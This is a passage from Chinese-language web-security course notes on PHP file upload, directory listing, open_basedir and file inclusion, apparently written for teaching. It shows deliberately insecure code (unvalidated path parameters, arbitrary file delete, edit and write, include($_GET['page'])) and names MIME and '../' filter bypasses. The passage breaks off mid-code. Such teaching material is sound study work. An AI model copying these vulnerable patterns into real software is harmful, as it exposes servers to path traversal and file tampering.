<p>MIME:<a target="_blank" rel="noopener" href="https://www.runoob.com/http/mime-types.html">MIME 类型 | 菜鸟教程</a></p>
<ul>
<li><strong>如果是图片在抓包内容Content-Type: image&#x2F;png</strong></li>
<li><strong>如果是exe文件抓包内容Content-Type: application&#x2F;x-msdownload</strong></li>
</ul>
</blockquote>
<p>实现方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MIME文件类型过滤</span></span><br><span class="line"><span class="comment">// 允许上传的文件 MIME 类型白名单</span></span><br><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"><span class="comment">// 检查文件 MIME 类型是否在允许的白名单中</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>, <span class="variable">$allow_type</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件 MIME 类型不在白名单中，输出非法文件类型信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法文件类型&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件 MIME 类型在白名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题：通过修改MIME值是否能绕过文件类型绕过呢？</p>
<p><img src="/img/xiaodi/image-20250515202133192.png" alt="image-20250515202133192"></p>
<p><img src="/img/xiaodi/image-20250515202219355.png" alt="image-20250515202219355"></p>
<h3 id="文件管理模块-显示-过滤机制"><a href="#文件管理模块-显示-过滤机制" class="headerlink" title="文件管理模块-显示-过滤机制"></a>文件管理模块-显示-过滤机制</h3><h4 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h4><p>功能：显示 上传 下载 删除 编辑 包含等<br>    1.打开目录读取文件列表<br>    2.递归循环读取文件列表<br>    3.判断是文件还是文件夹<br>    4.PHP.INI目录访问控制</p>
<p><strong>php相关函数及区别</strong></p>
<blockquote>
<p>is_dir() 函数用于检查指定的路径是否是一个目录（文件夹）<br>opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录<br>readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录<br>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录</p>
</blockquote>
<p><strong>opendir() 函数</strong>：</p>
<ul>
<li><strong><code>opendir()</code></strong> 用于打开一个目录句柄（directory handle）。</li>
<li>接受一个参数，即要打开的目录的路径。</li>
<li>返回一个目录句柄，该句柄可以用于后续对目录的操作。</li>
<li>通常与 <strong><code>closedir()</code></strong> 配合使用，用于关闭目录句柄。</li>
</ul>
<p><strong>readdir() 函数</strong>：</p>
<ul>
<li><strong><code>readdir()</code></strong> 用于读取目录句柄中的条目。</li>
<li>接受一个参数，即之前使用 <strong><code>opendir()</code></strong> 打开的目录句柄。</li>
<li>在每次调用时，返回目录中的下一个文件或目录的名称。</li>
<li>当没有更多的文件或目录时，返回 **<code>false</code>**。</li>
</ul>
<p>使用示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line"><span class="variable">$dir_handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/path/to/directory&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir_handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">closedir</span>(<span class="variable">$dir_handle</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>创建file-manage.php，实现功能</p>
<blockquote>
<ul>
<li>打开目录读取文件列表</li>
<li>递归循环读取文件列表</li>
<li>判断是文件还是文件夹</li>
</ul>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取要显示的目录，默认为当前目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?? <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开目录，读取文件列表 opendir</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filelist</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 判断目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="comment">// 循环读取文件列表 while readdir</span></span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是文件还是文件夹 is_dir</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 如果是文件夹，显示文件夹图标和链接</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=<span class="subst">$dir</span>/<span class="subst">$file</span>&#x27;&gt;&quot;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果是文件，显示文件图标和链接</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭目录句柄</span></span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$dh</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数显示目录文件列表</span></span><br><span class="line"><span class="title function_ invoke__">filelist</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>while</strong>循环迭代目录中的每个条目。<br><strong>readdir($dh)<strong>读取目录中的下一个条目。<br>循环继续，直到没有更多的条目（readdir返回false）。<br>在循环内部，</strong>is_dir($dir . ‘&#x2F;‘ . $file)检查当前目录项是否是一个目录，通过构建完整路径并使用is_dir</strong>函数来判断。<br>条件通过使用斜杠（&#x2F;）将目录路径（$dir）与当前目录项（$file）连接起来，形成完整的路径。</p>
</blockquote>
<h4 id="PHP-INI目录访问控制"><a href="#PHP-INI目录访问控制" class="headerlink" title="PHP.INI目录访问控制"></a>PHP.INI目录访问控制</h4><p>未做任何处理前</p>
<ul>
<li>使用<code>../</code>或者**<code>c:/</code>**等操作可以访问到目标服务器的所有文件目录</li>
</ul>
<p><img src="/img/xiaodi/image-20250515202828493.png" alt="image-20250515202828493"></p>
<p>开启相关功能</p>
<p>phpstudy_pro\Extensions\php\php7.0.9nts</p>
<ul>
<li>在目标文件夹出设置访问控制的的权限：<code>open_basedir =G:\develop\safety\phpstudy_pro\WWW</code> 注意取消掉前面的封号才能启用该功能</li>
<li>保存并重启小皮，发现WWW以外的目录均报错不能访问</li>
</ul>
<p><img src="/img/xiaodi/image-20250515202934617.png" alt="image-20250515202934617"></p>
<p>测试：</p>
<p><img src="/img/xiaodi/image-20250515203037421.png" alt="image-20250515203037421"></p>
<p>如果配置<code>../</code>或<code>c:\</code>进行过滤并不是安全的，通过<code>..\</code>、<code>..../</code>这些方法仍可绕过</p>
<p><img src="/img/xiaodi/79caca3721d036c678cb01cf65196cfc.png" alt="Untitled"></p>
<h2 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h2><p>PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>PHP相关文件包含函数：</p>
<blockquote>
<p>include() 在错误发生后脚本继续执行<br>require() 在错误发生后脚本停止执行<br>include_once() 如果已经包含，则不再执行<br>require_once() 如果已经包含，则不再执行</p>
</blockquote>
<p>使用include() 和 require()语句可以将一个PHP文件中的代码包含在另一个PHP文件中。包含文件与从指定的文件复制脚本并将其粘贴到调用它的位置产生相同的结果。</p>
<p><img src="/img/xiaodi/image-20250516190709817.png" alt="image-20250516190709817"></p>
<p><img src="/img/xiaodi/image-20250516190732593.png" alt="image-20250516190732593"></p>
<p>安全问题：当使用<code>include ($_GET[&#39;page&#39;]);</code>可以通过改变路由访问的方式，将访问的文件当作php文件进行处理获取文件信息</p>
<p><img src="/img/xiaodi/image-20250516191259622.png" alt="image-20250516191259622"></p>
<p>test.txt</p>
<p><img src="/img/xiaodi/image-20250516191328115.png" alt="image-20250516191328115"></p>
<p><img src="/img/xiaodi/image-20250516191339813.png" alt="image-20250516191339813"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>文件上传常用过滤机制</p>
<blockquote>
<p>1、无过滤机制<br>2、黑名单过滤机制<br>3、白名单过滤机制<br>4、文件类型过滤机制</p>
</blockquote>
<p>文件存储位置：</p>
<blockquote>
<p>1、上传至服务器本身的存储磁盘(源码在一起)<br>2、云产品OSS存储：<strong>云存储服务，旨在提高访问速度</strong> 对象去存储文件(泄漏安全)<br>3、把文件上传到其他域名,如：<a href="http://www.xiaodi8.com->[upload.xiaodi8.com](http://upload.xiaodi8.com/)">www.xiaodi8.com-&gt;[upload.xiaodi8.com](http://upload.xiaodi8.com/)</a></p>
</blockquote>
<p><strong>注意：上传到OSS云产品，只用来存储数据，不会对代码执行。</strong></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/42a61c548fbf179ae3acb7fbf09bf0f3.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES[“表单值”][“name”] 获取上传文件原始名称</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES[“表单值”][“<span class="built_in">type</span>”] 获取上传文件MIME类型</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES[“表单值”][“size”] 获取上传文件字节单位大小</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES[“表单值”][“tmp_name”] 获取上传的临时副本文件名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_FILES[“表单值”][“error”] 获取上传时发生的错误代码</span></span><br><span class="line">move_uploaded_file() 将上传的文件移动到指定位置的函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="文件显示"><a href="#文件显示" class="headerlink" title="文件显示"></a>文件显示</h3><p>实现步骤</p>
<blockquote>
<p>1.打开目录读取文件列表<br>2.递归循环读取文件列表<br>3.判断是文件还是文件夹<br>4.PHP.INI目录访问控制</p>
</blockquote>
<p>相关php函数</p>
<blockquote>
<p>is_dir() 函数用于检查指定的路径是否是一个目录<br>opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录<br>readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录<br>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录<br>ini_set(‘open_basedir’,DIR); 设置配置文件中，只能访问本目录</p>
</blockquote>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><ul>
<li><p>首先创建文件filemanage.php，然后创建有关html页面，并从网上找文件夹和文件的图片，保存至新创建的img目录</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b3a24092c37133b8d89ca29893c96cb4.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/55a3cd431414176afe34107c107f7a2b.png" alt="img"></p>
<p>在 PHP 中，readdir函数会返回目录中的下一个文件名，如果没有更多的文件，则返回false。因此，您的代码是在循环中读取目录中的文件名，直到<strong>readdir返回false</strong>为止。</p>
<p>“！&#x3D;”检查具有类型强制的不等式，而“！”检查没有类型强制的不等式，并检查类型是否相同。通常建议使用“！”进行严格比较，以避免意外的类型转换。</p>
<p>​	如果是文件夹那么先走文件夹的循环遍历，到最后链接到打开按钮上，如果被触发提交GET表单，那么就会再次获取定义好的函数，并再次区分文件夹和文件，走循环</p>
<p>​	遇到问题如果打开全都是文件的文件夹会报错：</p>
<p>​	**foreach循环尝试对一个无效的参数进行迭代。在你提供的代码中，这个警告可能是由于$list[‘dir’]或者$list[‘file’]**中的其中一个不是数组，或者根本不存在。</p>
<p>解决：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/618762d35c3ea344a9bdb3c16e4a265b.png" alt="Untitled"></p>
<p>filemanager.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?? <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]:<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获得文件名</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="comment">//获得路径</span></span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断，不是目录</span></span><br><span class="line"><span class="keyword">elseif</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;我只会吃瓜！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getlist</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$hd</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file_name</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$hd</span>) )!== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file_name</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file_name</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$file_path</span> = <span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$file_type</span> = <span class="title function_ invoke__">filetype</span>(<span class="variable">$file_path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$list</span>[<span class="variable">$file_type</span>][] = <span class="keyword">array</span>( <span class="comment">//$file_type = dir 和 file $list[&#x27;dir&#x27;] 和  $list[&#x27;file&#x27;]</span></span><br><span class="line">            <span class="string">&#x27;file_name&#x27;</span>=&gt;<span class="variable">$file_name</span>, <span class="comment">//文件名存储键值file_name</span></span><br><span class="line">            <span class="string">&#x27;file_path&#x27;</span>=&gt;<span class="variable">$file_path</span>, <span class="comment">//文件路径存储键值file_path</span></span><br><span class="line">            <span class="string">&#x27;file_size&#x27;</span>=&gt;<span class="title function_ invoke__">round</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$file_path</span>)/<span class="number">1024</span>), <span class="comment">//通过换算文件大小存储键值file_path</span></span><br><span class="line">            <span class="string">&#x27;file_time&#x27;</span>=&gt;<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y/m/d H:i:s&#x27;</span>,<span class="title function_ invoke__">filemtime</span>(<span class="variable">$file_path</span>)), <span class="comment">//获取文件时间并存储键值file_path</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$hd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$list</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$list</span>=<span class="title function_ invoke__">getlist</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//接受方法 判断是怎么操作</span></span><br><span class="line"><span class="comment">//echo $action;</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="comment">//$cmd=&quot;del $file&quot;;</span></span><br><span class="line">        <span class="comment">//system($cmd);</span></span><br><span class="line">        <span class="comment">//echo $cmd;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;down&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="variable">$file</span> . <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件名：&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件内容：&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;textarea name=&quot;code&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&quot;&gt;&#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测编辑后提交的事件 进入文件重新写入</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$file</span>&quot;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;table width=<span class="string">&quot;100%&quot;</span> style=<span class="string">&quot;font-size: 10px;text-align: center;&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;图标&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;名称&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;日期&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;大小&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;路径&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span>  <span class="keyword">foreach</span> (<span class="variable">$list</span>[<span class="string">&#x27;dir&#x27;</span>] <span class="keyword">as</span> <span class="variable">$v</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;img src=<span class="string">&quot;./img/list.png&quot;</span> width=<span class="string">&quot;20&quot;</span> height=<span class="string">&quot;20&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_name&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_time&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;-&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_path&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="string">&quot;?path=&lt;?php echo <span class="subst">$v</span>[&#x27;file_path&#x27;]?&gt;&quot;</span>&gt;打开&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span>  <span class="keyword">foreach</span> (<span class="variable">$list</span>[<span class="string">&#x27;file&#x27;</span>] <span class="keyword">as</span> <span class="variable">$v</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;img src=<span class="string">&quot;./img/file.png&quot;</span> width=<span class="string">&quot;20&quot;</span> height=<span class="string">&quot;20&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_name&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_time&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_size&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;file_path&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;a href=<span class="string">&quot;?a=edit&amp;path=&lt;?php echo <span class="subst">$v</span>[&#x27;file_path&#x27;]?&gt;&quot;</span>&gt;编辑&lt;/a&gt;</span><br><span class="line">                